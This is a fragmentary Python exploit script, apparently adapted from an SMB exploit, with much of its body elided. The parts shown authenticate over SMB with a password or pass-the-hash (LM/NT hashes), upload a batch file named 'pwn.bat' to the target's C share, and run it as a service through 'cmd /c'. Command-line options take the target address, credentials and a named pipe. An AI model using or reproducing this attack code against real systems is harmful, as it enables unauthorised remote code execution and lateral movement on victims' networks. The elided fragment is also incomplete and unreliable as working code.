...
def exploit(target, pipe_name):
	...
	conn.login(USERNAME, PASSWORD, lmhash=LM, nthash=NT, maxBufferSize=4356)
...
#	smbConn.disconnectTree(tid2)
	...
	smb_send_file(smbConn, '../../../www/pwn.bat', 'C', 'pwn.bat')
        service_exec(conn, r'cmd /c cmd /c c:\pwn.bat ' + METHOD)
...
parser.add_argument('-u', metavar='username', required=False, type=str, help='SMB username.')
parser.add_argument('-p', metavar='password', required=False, type=str, help='SMB password.')
parser.add_argument('-n', metavar='nt', required=False, type=str, help='NT hash')
parser.add_argument('-l', metavar='lm', required=False, type=str, help='LM hash')
parser.add_argument('-m', metavar='method', required=False, type=str, help='PWN method, default="sdll"')
parser.add_argument('target', type=str, help='Target system address.')
parser.add_argument('pipe_name', type=str, help='Pipe name. e.g.: samr, netlogon, ipc$, admin$, etc.')
...
exploit(args.target, args.pipe_name)
print('Done')
